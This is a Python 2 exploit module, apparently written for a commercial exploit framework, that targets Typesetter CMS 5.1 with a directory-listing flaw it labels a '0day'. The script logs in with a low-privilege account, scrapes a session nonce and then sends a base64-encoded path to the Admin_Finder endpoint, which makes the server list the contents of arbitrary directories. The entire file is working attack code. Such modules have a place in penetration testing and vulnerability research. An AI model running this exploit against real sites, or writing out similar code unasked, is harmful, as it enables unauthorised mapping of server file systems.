#!/usr/bin/env python
import urllib2
import cookielib
import json
import base64
import re

from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO["NAME"] = "efa_typesetter_cms_dir_listing"
INFO["DESCRIPTION"] = "Typesetter CMS Directory Listing"
INFO["VENDOR"] = "https://www.typesettercms.com/"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = "https://www.typesettercms.com/Download"
INFO["LINKS"] = []
INFO["CHANGELOG"] = "7 May, 2018"
INFO["PATH"] = "Web/"
INFO["NOTES"] = """
    User with "Uploaded Files" permission can list directories using "../".
Tested against Typesetter 5.1.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.0.16"
OPTIONS["PORT"] = 80
OPTIONS["BASEPATH"] = "/typesetter"
OPTIONS["DIRECTORY"] = "/"
OPTIONS["SSL"] = False
OPTIONS["USERNAME"] = 'guest'
OPTIONS["PASSWORD"] = 'guest'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.ssl = self.args.get("SSL", OPTIONS["SSL"])
        self.base = self.args.get("BASEPATH", OPTIONS["BASEPATH"]).strip('/')
        self.directory = self.args.get("DIRECTORY", OPTIONS["DIRECTORY"])
        self.username = self.args.get("USERNAME", OPTIONS["USERNAME"])
        self.password = self.args.get("PASSWORD", OPTIONS["PASSWORD"])

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '{}://{}:{}/{}/'.format(proto, self.host, self.port, self.base) + path
        return url

    def login(self):
        self.log('[*] Trying to login')
        cookie = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        url = self.make_url('index.php/Admin')
        res = opener.open(url).read()
        nonce = re.findall('[a-f0-9]{128}', res)[0]

        data = 'file=&cmd=login&login_nonce=%s&username=%s&user_sha=&password=%s&' \
               'pass_md5=&pass_sha=&pass_sha512=&remember=on&verified=' % (nonce, self.username, self.password)
        res = opener.open(url, data).read()
        if 'Logout' not in res:
            self.log('[-] Can\'t log in')
            self.finish(False)
        nonce = re.findall('[a-f0-9]{128}', res)[0]
        self.log('[+] User %s successfully logged in' % self.username)
        self.opener = opener
        self.nonce = nonce

    def run(self):
        #Get options from gui
        self.args()
        self.login()
        self.log('[*] Trying to list dir')
        url = self.make_url('index.php/Admin_Finder')
        directory = base64.b64encode(self.directory)
        data = 'verified=%s&cmd=open&target=l1_%s&init=1&tree=1' % (self.nonce, directory)
        res = self.opener.open(url, data).read()
        data = json.loads(res)
        files = data.get('files')
        self.log('\r\n' + '\r\n'.join('%s\t%s' % (file.get('name'), file.get('mime')) for file in files))
        # self.log(res)
        self.finish(True)



if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()